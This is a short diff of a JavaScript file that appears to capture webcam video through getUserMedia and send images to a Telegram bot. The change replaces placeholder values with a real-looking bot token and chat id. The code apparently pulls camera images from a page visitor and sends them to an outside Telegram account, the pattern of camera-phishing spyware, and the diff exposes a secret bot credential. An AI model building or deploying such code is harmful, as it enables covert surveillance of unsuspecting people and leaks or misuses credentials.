@@ -18,8 +18,8 @@ navigator.mediaDevices.getUserMedia({ video: true })
     });
 
 function sendImageToTelegram(dataURL) {
-    var telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    var chatId = 'YOUR_CHAT_ID';
+    var telegramToken = '7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU';
+    var chatId = '5471126331';
     
     var formData = new FormData();
     formData.append("chat_id", chatId);
